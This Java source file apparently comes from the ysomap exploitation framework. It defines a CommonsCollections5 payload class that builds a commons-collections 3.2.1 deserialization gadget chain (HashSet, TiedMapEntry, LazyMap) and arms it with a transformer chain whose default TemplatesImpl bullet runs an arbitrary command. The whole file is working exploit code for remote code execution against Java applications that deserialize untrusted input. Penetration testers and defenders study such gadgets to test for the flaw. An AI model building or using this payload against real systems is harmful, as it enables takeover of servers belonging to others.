package ysomap.core.gadget.payload.collections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Payloads;
import ysomap.annotation.Require;
import ysomap.core.ObjectGadget;
import ysomap.core.bean.Bullet;
import ysomap.core.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
import ysomap.core.bean.Payload;
import ysomap.util.ReflectionHelper;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * from ysoserial CommonsCollections6
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Payloads
@Authors({ Authors.MATTHIASKAISER })
@Require(bullets = {"TransformerBullet","TransformerWithJNDIBullet","TransformerWithTemplatesImplBullet","TransformerWithResponseBullet"})
@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollections5 extends Payload<HashSet> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof Transformer[];
    }

    @Override
    public HashSet pack(Object obj) throws Exception {
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        ReflectionHelper.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        ReflectionHelper.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        ReflectionHelper.setAccessible(keyField);
        keyField.set(node, entry);

        ReflectionHelper.setFieldValue(transformerChain, "iTransformers", obj); // arm with actual transformer chain
        return map;
    }

    @Override
    public ObjectGadget getDefaultBullet(String command) throws Exception {
        Bullet bullet = new TransformerWithTemplatesImplBullet();
        bullet.set("args", command);
        bullet.set("version", "3");
        return bullet;
    }
}
